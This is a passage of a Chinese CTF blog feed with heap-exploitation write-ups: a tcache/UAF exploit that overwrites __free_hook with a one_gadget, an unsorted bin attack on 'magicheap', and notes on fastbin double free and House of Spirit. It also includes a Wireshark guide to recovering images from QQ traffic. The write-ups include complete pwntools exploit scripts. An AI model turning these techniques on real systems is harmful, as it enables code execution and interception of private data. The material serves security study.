title="思路"></a>思路</h4><p>现已知条件</p><ol><li>保护全开，got表不可改</li><li>存在堆溢出</li><li>free时指针未置空，可以UAF</li></ol><p>利用</p><ol><li>可以通过unsorted bin泄露libc</li><li>可以通过堆溢出进行house_Spirit</li><li>既然got表不可改，那就只能劫持hook了，因为没有条件来执行system(‘&#x2F;bin&#x2F;sh’),那就把hook函数改成onegadget</li></ol><h5 id="libc泄露"><a href="#libc泄露" class="headerlink" title="libc泄露"></a>libc泄露</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python">add(<span class="hljs-number">0x80</span>,<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">8</span>)<br>add(<span class="hljs-number">0x80</span>,<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">8</span>)<br>add(<span class="hljs-number">0x80</span>,<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">8</span>)<br>add(<span class="hljs-number">0x80</span>,<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">8</span>)<br>add(<span class="hljs-number">0x80</span>,<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">8</span>)<br>add(<span class="hljs-number">0x80</span>,<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">8</span>)<br>add(<span class="hljs-number">0x80</span>,<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">8</span>)<br>add(<span class="hljs-number">0x80</span>,<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">8</span>)<br>add(<span class="hljs-number">0x80</span>,<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">8</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">8</span>):<br>delt(i)<br>show(<span class="hljs-number">7</span>)<br>io.recvuntil(<span class="hljs-string">&quot;The content of this note is :&quot;</span>)<br>bss=io.recv(<span class="hljs-number">7</span>)<br>bss=bss[::-<span class="hljs-number">1</span>]<br>bss=<span class="hljs-built_in">int</span>.from_bytes(bss)<br>base=((bss)&gt;&gt;<span class="hljs-number">8</span>)-<span class="hljs-number">96</span>-<span class="hljs-number">0x10</span>-libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br>free_hook=base+libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]<br></code></pre></td></tr></table></figure><p>这个是为了填满tcachebins，从而进入unsorted bin,用UAF打印从而来泄露main_arena+偏移，这个偏移与glibc版本有关，glibc2.31的是96，而main_arena距离malloc_hook的偏移是0x10</p><p><img src="/img/tcachebins/i" alt="img"></p><h5 id="free-hook劫持"><a href="#free-hook劫持" class="headerlink" title="free_hook劫持"></a>free_hook劫持</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python">edit(<span class="hljs-number">6</span>,<span class="hljs-number">8</span>,p64(free_hook))<br>add(<span class="hljs-number">0x80</span>,<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">8</span>)<br>onegadget=<span class="hljs-number">0xe3b01</span><br>add(<span class="hljs-number">0x80</span>,p64(base+onegadget))<br>io.recvuntil(<span class="hljs-string">&quot;Your choice : &gt; &quot;</span>)<br>io.send(<span class="hljs-string">&#x27;4&#x27;</span>)<br></code></pre></td></tr></table></figure><p>用UAF将第7个chunk的fd指针改为free_hook</p><p><img src="/img/tcachebins/j" alt="img"></p><p>接着在申请chunk的时候，将free_hook改为onegadget</p><p><img src="/img/tcachebins/k" alt="img"></p><p>那么此时执行free函数能getshell了</p><p>这道题回过头来看并不是很难，是初学者检验自己的一个很好的练习</p><h4 id="最终exp"><a href="#最终exp" class="headerlink" title="最终exp"></a>最终exp</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">size,payload</span>):<br>io.recvuntil(<span class="hljs-string">&quot;Your choice : &gt; &quot;</span>)<br>io.send(<span class="hljs-string">&#x27;1&#x27;</span>)<br>io.recvuntil(<span class="hljs-string">&quot;The size of this note : &quot;</span>)<br>io.sendline(<span class="hljs-built_in">str</span>(size))<br>io.recvuntil(<span class="hljs-string">&quot;The content of this note : &quot;</span>)<br>io.send(payload)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">idx,size,payload</span>):<br>io.recvuntil(<span class="hljs-string">&quot;Your choice : &gt; &quot;</span>)<br>io.send(<span class="hljs-string">&#x27;2&#x27;</span>)<br>io.recvuntil(<span class="hljs-string">&quot;The index of this note : &quot;</span>)<br>io.send(<span class="hljs-built_in">str</span>(idx))<br>io.recvuntil(<span class="hljs-string">&quot;The size of this content : &quot;</span>)<br>io.send(<span class="hljs-built_in">str</span>(size))<br>io.recvuntil(<span class="hljs-string">&quot;The content of this note : &quot;</span>)<br>io.send(payload)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">idx</span>):<br>io.recvuntil(<span class="hljs-string">&quot;Your choice : &gt; &quot;</span>)<br>io.send(<span class="hljs-string">&#x27;3&#x27;</span>)<br>io.recvuntil(<span class="hljs-string">&quot;The index of this note : &quot;</span>)<br>io.send(<span class="hljs-built_in">str</span>(idx))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delt</span>(<span class="hljs-params">idx</span>):<br>io.recvuntil(<span class="hljs-string">&quot;Your choice : &gt; &quot;</span>)<br>io.send(<span class="hljs-string">&#x27;4&#x27;</span>)<br>io.recvuntil(<span class="hljs-string">&quot;The index of this note : &quot;</span>)<br>io.send(<span class="hljs-built_in">str</span>(idx))<br>io=process(<span class="hljs-string">&#x27;./attachment&#x27;</span>)<br><span class="hljs-comment">#io=remote(&#x27;27.25.151.80&#x27;,&#x27;35644&#x27;)</span><br>libc=ELF(<span class="hljs-string">&#x27;./libc-2.31.so&#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]))<br>add(<span class="hljs-number">0x80</span>,<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">8</span>)<br>add(<span class="hljs-number">0x80</span>,<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">8</span>)<br>add(<span class="hljs-number">0x80</span>,<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">8</span>)<br>add(<span class="hljs-number">0x80</span>,<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">8</span>)<br>add(<span class="hljs-number">0x80</span>,<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">8</span>)<br>add(<span class="hljs-number">0x80</span>,<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">8</span>)<br>add(<span class="hljs-number">0x80</span>,<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">8</span>)<br>add(<span class="hljs-number">0x80</span>,<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">8</span>)<br>add(<span class="hljs-number">0x80</span>,<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">8</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">8</span>):<br>delt(i)<br>gdb.attach(io)<br>show(<span class="hljs-number">7</span>)<br>io.recvuntil(<span class="hljs-string">&quot;The content of this note is :&quot;</span>)<br>bss=io.recv(<span class="hljs-number">7</span>)<br>bss=bss[::-<span class="hljs-number">1</span>]<br>bss=<span class="hljs-built_in">int</span>.from_bytes(bss)<br>base=((bss)&gt;&gt;<span class="hljs-number">8</span>)-<span class="hljs-number">96</span>-<span class="hljs-number">0x10</span>-libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br>free_hook=base+libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(base))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(free_hook))<br>show(<span class="hljs-number">1</span>)<br>io.recvuntil(<span class="hljs-string">&quot;The content of this note is :&quot;</span>)<br>dui=io.recv(<span class="hljs-number">7</span>)<br>dui=dui[::-<span class="hljs-number">1</span>]<br>dui=<span class="hljs-built_in">int</span>.from_bytes(dui)<br>dui=((dui)&gt;&gt;<span class="hljs-number">8</span>)-<span class="hljs-number">0x2a0</span>+<span class="hljs-number">0x010</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(dui))<br>edit(<span class="hljs-number">6</span>,<span class="hljs-number">8</span>,p64(free_hook))<br>add(<span class="hljs-number">0x80</span>,<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">8</span>)<br>onegadget=<span class="hljs-number">0xe3b01</span><br>add(<span class="hljs-number">0x80</span>,p64(base+onegadget))<br>io.recvuntil(<span class="hljs-string">&quot;Your choice : &gt; &quot;</span>)<br>io.send(<span class="hljs-string">&#x27;4&#x27;</span>)<br>pause()<br>io.interactive()<br><br></code></pre></td></tr></table></figure><h3 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h3><p><a href="https://www.cnblogs.com/Theffth-blog/p/12790720.html">[Tcache Attack学习记录]</a></p><p><a href="https://blog.csdn.net/qq_41988448/article/details/103755773">pwn学习总结（五） —— 堆溢出经典题型整理</a></p>]]></content>
      
      
      <categories>
          
          <category> 堆利用 </category>
          
          <category> tcachebins </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 原创 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>qq流量分析</title>
      <link href="/2024/10/11/qq%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/"/>
      <url>/2024/10/11/qq%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<h1 id="qq流量分析"><a href="#qq流量分析" class="headerlink" title="qq流量分析"></a>qq流量分析</h1><h3 id="1-确保电脑和手机连在同一个局域网内"><a href="#1-确保电脑和手机连在同一个局域网内" class="headerlink" title="1.确保电脑和手机连在同一个局域网内"></a>1.确保电脑和手机连在同一个局域网内</h3><p>接着我们打开wireshark开始抓包</p><p><img src="/img/qq%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/a"></p><p>我们可以通过搜索qq号来确定哪些包是qq的流量包</p><p><img src="/img/qq%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/b"></p><p>接着随便打开一个qq流量包进行分析</p><p><img src="/img/qq%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/c"></p><p>可以看到wireshark已经将数据包的每一层都分了出来，可以清楚的看到这个包用的协议是tcp,以及源ip和目标ip</p><p>接下来我们从手机往电脑发一张jpg图片，因为jpg的文件头是 ffd8,我们搜索即可</p><p><img src="/img/qq%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/d"></p><p>发现了数据包，接着我们追踪tcp流来保存图片</p><p><img src="/img/qq%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/e"></p><p>因为保存下来的数据包括了数据包的报文头，我们要把他删掉才能恢复数据</p><p><img src="/img/qq%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/f"></p><p><img src="/img/qq%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/g"></p><p>可以看到图片被我拿到了</p><p><img src="/img/qq%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/h"></p>]]></content>
      
      
      <categories>
          
          <category> 网络渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 原创 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>unsortedbin_attack</title>
      <link href="/2024/10/08/unsortedbin-attack/"/>
      <url>/2024/10/08/unsortedbin-attack/</url>
      
        <content type="html"><![CDATA[<h1 id="unsortedbin-attack——magicheap"><a href="#unsortedbin-attack——magicheap" class="headerlink" title="unsortedbin_attack——magicheap"></a>unsortedbin_attack——magicheap</h1><h3 id="unsorted-bin回顾"><a href="#unsorted-bin回顾" class="headerlink" title="unsorted bin回顾"></a>unsorted bin回顾</h3><p>以下内容来自wiki</p><p>Unsorted bin可视为空闲chunk回归所属bin之前的缓冲区。Unsorted bin处于bin数组下标1处，所以Unsorted bin只有一个链表，并且是双向链表。因此Unsorted bin中的chunk不按照size进行分类，所有空闲chunk处于乱序状态</p><h5 id="Unsorted-bin中chunk的主要来源"><a href="#Unsorted-bin中chunk的主要来源" class="headerlink" title="Unsorted bin中chunk的主要来源"></a>Unsorted bin中chunk的主要来源</h5><ol><li>当一个较大的chunk被分割成两部分后，如果剩下的部分大于MINSIZE，则会被放进Unsorted bin中</li><li>释放一个不属于fast bin的chunk，并且该chunk不与top chunk相邻，该 chunk会被首先放到Unsorted bin中</li><li>当进行malloc_consolidate（块合并）时，如果合并后的chunk不与top chunk相邻，则可能会把合并后的chunk放到Unsorted bin中</li></ol><h5 id="基本使用情况"><a href="#基本使用情况" class="headerlink" title="基本使用情况"></a>基本使用情况</h5><ol><li>Unsorted Bin在使用过程中，采用的遍历顺序是FIFO（先进先出），即挂进链表的时候依次从Unsorted bin的头部向尾部挂，取的时候是从尾部向头部取(这里的先进先出是指取出时候的操作，插入时采取的是后进先出的顺序)</li><li>在程序malloc时，如果fast bin、small bin中找不到对应大小的chunk，就会尝试从Unsorted bin中寻找chunk。如果取出来的chunk的size刚好满足，则直接交给用户，否则就会把这些chunk分别插入到对应的bin中</li></ol><h3 id="unsortedbin-attack"><a href="#unsortedbin-attack" class="headerlink" title="unsortedbin_attack"></a>unsortedbin_attack</h3><h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><p>当有一个unsorted bin是空的时候和挂着chunk的情况分别如图</p><p><img src="/img/unsortedbin-attack/a"></p><p>当无chunk时，unsorted bin  的两个指针都指向自身，而有一个chunk挂进unsorted bin 时他们的指针互指形成双链表</p><p>这时候我们通过如果某种手段将chunk的bk指针改成其他地方，就会如下</p><p><img src="/img/unsortedbin-attack/b"></p><p>此时unsorted bin的链表结构会被破坏出现corrupted，这时我们重新申请一个合适chunk时，程序会把chunk把从unsorted bin 中摘掉，但是由于本身的结构呗破坏，所以unsorted bin的fd指针还是会指向原先的chunk(这个可以自己去网上查查)，但是实际上chunk已经没了，而target变成了与unsorted bin相邻的链表，就会出现下图的情况</p><p><img src="/img/unsortedbin-attack/c"></p><p>unsorted bin的fd指针顺着原先的chunk指向了我们的target chunk(个人认为这样教好理解)，而bk指针就直接指向了target_presize,同样的target 的值就变成了unsorted bin的bk指针，变成了一个很大的值。</p><p>可以看到虽然这种方式可以实现任意写，但是内容并不受我们控制，而是随机的</p><p>接下来用个题目理解一下吧</p><h3 id="magicheap"><a href="#magicheap" class="headerlink" title="magicheap"></a><a href="https://files.buuoj.cn/files/17ee5e3cac3625381a461f7a0fb17bc1/magicheap">magicheap</a></h3><h4 id="creat函数"><a href="#creat函数" class="headerlink" title="creat函数"></a>creat函数</h4><p><img src="/img/unsortedbin-attack/d"></p><p>这个函数很好理解，就是输入大小如何创建chunk罢了</p><h4 id="delete函数"><a href="#delete函数" class="headerlink" title="delete函数"></a>delete函数</h4><p><img src="/img/unsortedbin-attack/e"></p><p>这个也没什么好说的，就是释放函数</p><h4 id="edit函数"><a href="#edit函数" class="headerlink" title="edit函数"></a>edit函数</h4><p><img src="/img/unsortedbin-attack/f"></p><p>这个函数就有说法啦，这个编辑函数要求我们重新输入size,这不就坏了吗，如果这个size比创建的时候大，就造成了堆溢出</p><h4 id="main函数"><a href="#main函数" class="headerlink" title="main函数"></a>main函数</h4><p><img src="/img/unsortedbin-attack/g"></p><p><img src="/img/unsortedbin-attack/h"></p><p>主函数也是经典的类型，并且给了后面，但是进入的条件是magic大于0x1305</p><h4 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h4><p>这道题较为简单，我就直接说思路了，前面我们刚刚学了unsorted bin attack,不就是能把任意的地址的值变大吗</p><p><img src="/img/unsortedbin-attack/i"></p><p>我们先创建三个chunk</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">create_heap(<span class="hljs-number">0x20</span>, <span class="hljs-string">&quot;hollk&quot;</span>)  <span class="hljs-comment"># idx = 0 溢出chunk</span><br>create_heap(<span class="hljs-number">0x80</span>, <span class="hljs-string">&quot;hollk&quot;</span>)  <span class="hljs-comment"># idx = 1 被溢出chunk，挂进Unsorted bin</span><br>create_heap(<span class="hljs-number">0x30</span>, <span class="hljs-string">&quot;hollk&quot;</span>)  <span class="hljs-comment"># idx = 2 隔绝top_chunk</span><br></code></pre></td></tr></table></figure><p>第一个chunk是为了溢出修改chunk2的bk指针，第三个chunk是为了挂进unsorted bin,第三个chunk是为了让chunk2不直接与topchunk相邻，从而让他挂进unsorted bin</p><p>接着溢出修改bk指针</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">payload=p64(<span class="hljs-number">0</span>)*<span class="hljs-number">5</span>+p64(<span class="hljs-number">0x91</span>)+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x602090</span>)<br>edit_heap(<span class="hljs-number">0</span>,<span class="hljs-number">64</span>,payload)<br></code></pre></td></tr></table></figure><p><img src="/img/unsortedbin-attack/j"></p><p>可以看到此时bk已经覆盖</p><p>最后在申请chunk造成攻击</p><p><img src="/img/unsortedbin-attack/k"></p><p><img src="/img/unsortedbin-attack/l"></p><p>可以看到magic已经变得很大，就可以打通了</p><h5 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>io=process(<span class="hljs-string">&#x27;./magicheap&#x27;</span>)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">create_heap</span>(<span class="hljs-params">size, content</span>):<br>    io.recvuntil(<span class="hljs-string">&quot;:&quot;</span>)<br>    io.sendline(<span class="hljs-string">&quot;1&quot;</span>)<br>    io.recvuntil(<span class="hljs-string">&quot;:&quot;</span>)<br>    io.sendline(<span class="hljs-built_in">str</span>(size))<br>    io.recvuntil(<span class="hljs-string">&quot;:&quot;</span>)<br>    io.sendline(content)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit_heap</span>(<span class="hljs-params">idx, size, content</span>):<br>    io.recvuntil(<span class="hljs-string">&quot;:&quot;</span>)<br>    io.sendline(<span class="hljs-string">&quot;2&quot;</span>)<br>    io.recvuntil(<span class="hljs-string">&quot;:&quot;</span>)<br>    io.sendline(<span class="hljs-built_in">str</span>(idx))<br>    io.recvuntil(<span class="hljs-string">&quot;:&quot;</span>)<br>    io.sendline(<span class="hljs-built_in">str</span>(size))<br>    io.recvuntil(<span class="hljs-string">&quot;:&quot;</span>)<br>    io.sendline(content)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">del_heap</span>(<span class="hljs-params">idx</span>):<br>    io.recvuntil(<span class="hljs-string">&quot;:&quot;</span>)<br>    io.sendline(<span class="hljs-string">&quot;3&quot;</span>)<br>    io.recvuntil(<span class="hljs-string">&quot;:&quot;</span>)<br>    io.sendline(<span class="hljs-built_in">str</span>(idx))<br><br>create_heap(<span class="hljs-number">0x20</span>, <span class="hljs-string">&quot;hollk&quot;</span>)  <span class="hljs-comment"># idx = 0 溢出chunk</span><br>create_heap(<span class="hljs-number">0x80</span>, <span class="hljs-string">&quot;hollk&quot;</span>)  <span class="hljs-comment"># idx = 1 被溢出chunk，挂进Unsorted bin</span><br>create_heap(<span class="hljs-number">0x30</span>, <span class="hljs-string">&quot;hollk&quot;</span>)  <span class="hljs-comment"># idx = 2 隔绝top_chunk</span><br>del_heap(<span class="hljs-number">1</span>)<br>payload=p64(<span class="hljs-number">0</span>)*<span class="hljs-number">5</span>+p64(<span class="hljs-number">0x91</span>)+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x602090</span>)<br>edit_heap(<span class="hljs-number">0</span>,<span class="hljs-number">64</span>,payload)<br>create_heap(<span class="hljs-number">0x80</span>, <span class="hljs-string">&quot;hollk&quot;</span>)<br>gdb.attach(io)<br>io.recvuntil(<span class="hljs-string">&quot;:&quot;</span>)<br>io.send(<span class="hljs-string">&#x27;4869&#x27;</span>)<br><span class="hljs-comment">#gdb.attach(io)</span><br><span class="hljs-comment">#pause()</span><br>io.interactive()<br></code></pre></td></tr></table></figure><h3 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h3><p><a href="https://blog.csdn.net/qq_41202237/article/details/112589899#:~:text=Unsorted%20B">好好说话之Unsorted Bin Attack</a></p><p><a href="https://ctf-wiki.org/pwn/linux/user-mode/heap/ptmalloc2/unsorted-bin-attack/#unsorted-bin-leak">Unsorted Bin Attack</a></p>]]></content>
      
      
      <categories>
          
          <category> 堆利用 </category>
          
          <category> unsortedbin </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 原创 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>fastbin_attack_double_free</title>
      <link href="/2024/10/06/fastbin-double-free/"/>
      <url>/2024/10/06/fastbin-double-free/</url>
      
        <content type="html"><![CDATA[<h1 id="fastbin-attack-double-free"><a href="#fastbin-attack-double-free" class="headerlink" title="fastbin_attack_double_free"></a><code>fastbin_attack_double_free</code></h1><h3 id="Fastbin-Attack"><a href="#Fastbin-Attack" class="headerlink" title="Fastbin Attack"></a><code>Fastbin Attack</code></h3><p>简单的介绍一下，我们可以根据名字看出，这一类漏洞利用的方法主要基于fastbin机制的缺陷，其实fastbin attack并不是指某一种利用方法，而是一些。这类利用的前提是：</p><p>存在堆溢出、use-after-free等能控制chunk内容的漏洞<br>漏洞发生于<code>fastbin</code>类型的chunk中<br>如果细分的话，可以做如下的分类：</p><p><code>Fastbin Double Free</code><br><code>House of Spirit</code><br><code>Alloc to Stack</code><br><code>Arbitrary Alloc</code><br>前两种主要漏洞侧重于利用free函数释放的真的 chunk或伪造的chunk，然后再次申请chunk进行攻击，后两种侧重于故意修改<code>fd</code>指针，直接利用<code>malloc</code>申请指定位置chunk进行攻击。这篇文章主要讲解的是<code>Fastbin Double Free</code>，后几种会在之后文章中继续讲解</p><h2 id="原理："><a href="#原理：" class="headerlink" title="原理："></a>原理：</h2><p>1.<code>fastbin</code> 管理chunk是单链表管理</p><p>2.由<code>fastbin</code>管理的chunk即使被释放，其next_chunk的<code>prev_inuse位也不会被清空</code></p><h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><p>先创建3个chunk并free掉，可以看到三个chunk按单链表的形式进入<code>fastbin</code>,</p><p><img src="/img/doublefree/a"></p><p><code>chunk3</code>的<code>fd</code>指针是指向<code>chunk2</code>的，<code>chunk2</code>的<code>fd</code>指针是指向<code>chunk1</code>,那么是谁来指向<code>chunk3</code>呢？</p><p>其实是<strong>main_arena</strong>指向了<code>chunk3</code>的<code>prev_size</code></p><p>并且free的验证只验证<strong>main_arena</strong>指向的chunk,</p><p>也就是说<code>fastbin</code>中的<code>chunk1</code>是可以再次free的</p><p><img src="/img/doublefree/b"></p><p>此时<code>chunk1</code>的<code>fd</code>指针是指向<code>chunk2</code>的，如果我们可以控制<code>chunk1</code>的<code>fd</code>指针，我们假设将指针指向一个在<code>bss</code>段的未free的chunk,在把三个chunk重新申请</p><p><img src="/img/doublefree/c"></p><p>可以看到，虽然<code>bss_chunk</code>没有free,但是<code>fastbin</code>还是把他当成free来用</p>]]></content>
      
      
      <categories>
          
          <category> 堆利用 </category>
          
          <category> fastbin </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 原创 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>fastbin_House Of Spirit</title>
      <link href="/2024/10/04/fastbin_House%20Of%20Spirit/"/>
      <url>/2024/10/04/fastbin_House%20Of%20Spirit/</url>
      
        <content type="html"><![CDATA[<h1 id="Fastbin-attack-House-Of-Spirit"><a href="#Fastbin-attack-House-Of-Spirit" class="headerlink" title="Fastbin_attack_House Of Spirit"></a>Fastbin_attack_House Of Spirit</h1><h2 id="House-Of-Spirit"><a href="#House-Of-Spirit" class="headerlink" title="House Of Spirit"></a>House Of Spirit</h2><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>House of Spirit这种技术的核心在于在目标位置处伪造fastbin chunk，并将其释放，从而达到分配<code>指定地址</code>的chunk的目的</p><h3 id="与double-free的区别"><a href="#与double-free的区别" class="headerlink" title="与double_free的区别"></a>与double_free的区别</h3><p>double_free利用的是malloc自己生成的chunk,但是House of Spirit是为了释放任意可写地址的chunk,这个chunk可以由我们自己来构造，相比于double_free来说限制少得多</p><h3 id="伪造检查"><a href="#伪造检查" class="headerlink" title="伪造检查"></a>伪造检查</h3><p>我们在释放这个伪造的chunk的时候他是不能够直接挂进fastbin单向链表中的，因为你在释放时，需要经过一些检查，去判断该释放的chunk是否为程序自身创建的。那么我们需要做的就是绕过这些检查</p><ol><li>fake chunk 的 ISMMAP 位不能为 1，因为 free 时，如果是 mmap 的 chunk，会单独处理</li><li>fake chunk 地址需要对齐， MALLOC_ALIGN_MASK</li><li>fake chunk 的 size 大小需要满足对应的 fastbin 的需求，同时也得对齐</li><li>fake chunk 的 next chunk 的大小不能小于 <code>2 * SIZE_SZ</code>，同时也不能大于<code>av-&gt;system_mem</code> </li><li>fake chunk 对应的 fastbin 链表头部不能是该 fake chunk，即不能构成 double free 的情况</li></ol><p>接下来我们用题目来更好的理解</p><h2 id="2014-hack-lu-oreo"><a href="#2014-hack-lu-oreo" class="headerlink" title="2014 hack.lu oreo"></a><a href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/heap/fastbin-attack/2014_hack.lu_oreo">2014 hack.lu oreo</a></h2><h3 id="add-sub-8048644-函数"><a href="#add-sub-8048644-函数" class="headerlink" title="add(sub_8048644)函数"></a>add(sub_8048644)函数</h3><p><img src="/img/Spirit/a"></p><p>我们来分析一下这个函数，它先是让v1指向dword_804A288，然后请0x38大小的chunk，并把chunk指针存在dword_804A288，重点是下面的一句代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">*((_DWORD *)dword_804A288 + <span class="hljs-number">13</span>) = v1;<br></code></pre></td></tr></table></figure><p>把v1存到(_DWORD *)dword_804A288 + 13的位置，而一个_DWORD 